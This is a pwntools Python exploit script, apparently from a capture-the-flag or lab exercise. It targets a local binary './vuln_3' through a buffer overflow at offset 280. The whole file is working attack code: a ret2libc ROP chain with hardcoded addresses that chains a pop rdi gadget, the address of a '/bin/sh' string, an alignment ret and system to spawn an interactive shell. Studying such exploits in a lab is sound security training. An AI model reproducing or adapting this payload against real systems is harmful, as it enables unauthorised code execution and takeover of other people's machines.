from pwn import *

# tell pwltools we're using 64 bit
context.update(arch="amd64")

p = process("./vuln_3")

overflow_offset = 280

# Payload
# 0x0000000000401273         # addr of pop rdi; ret
# 0x00007ffff7f785bd         # arg going into RDI before system call (/bin/sh)
# 0x0000000000401274         # ret. Aligns stack. Grab the ret from the tail end of pop rdi; ret (the byte after 0x0000000000401273)
# 0x00007ffff7e16290         # call system, with arg1 in RDI, to call /bin/sh

pop_rdi_ret = p64(0x0000000000401273)
bin_sh_addr = p64(0x00007ffff7f785bd)
ret = p64(0x0000000000401274)
system_addr = p64(0x00007ffff7e16290)

payload = b"A" * overflow_offset
payload += pop_rdi_ret
payload += bin_sh_addr
payload += ret
payload += system_addr

# Attach GDB
# vuln_debug = attach(p, "c", api=True)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")
p.interactive()
